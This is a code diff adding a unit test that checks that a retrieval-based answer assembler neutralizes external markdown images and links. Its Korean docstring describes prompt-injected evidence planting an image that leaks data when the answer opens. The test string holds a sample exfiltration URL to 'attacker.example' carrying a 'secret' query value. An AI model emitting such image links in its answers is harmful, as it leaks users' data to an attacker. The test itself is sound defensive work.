@@ -48,6 +48,17 @@ class QueryAnswerAssemblerTest(unittest.TestCase):
         self.assertNotIn("B0003", answer.content)
         self.assertIn("[1]", answer.content)
 
+    def test_external_images_and_links_are_neutralized_in_answer(self) -> None:
+        """근거에 숨은 지시로 외부 이미지가 들어오면 답변을 열기만 해도 내용이 새어 나간다."""
+        assembler = QueryAnswerAssembler(FixedAnswerGenerator(""))
+
+        answer, _ = assembler.renumber_used_evidence(
+            GeneratedAnswer(content="답변 ![x](https://attacker.example/x.png?q=비밀) [출처](https://web.example/a)"),
+            [],
+        )
+
+        self.assertEqual(answer.content, "답변 외부 이미지(attacker.example) 출처 (web.example)")
+
     def test_block_refs_are_removed_from_unsupported_answer(self) -> None:
         """generate_supported_answer를 거치지 않는 경로(answer_query의 미지원 답변)도 통과 지점이다."""
         assembler = QueryAnswerAssembler(FixedAnswerGenerator(""))
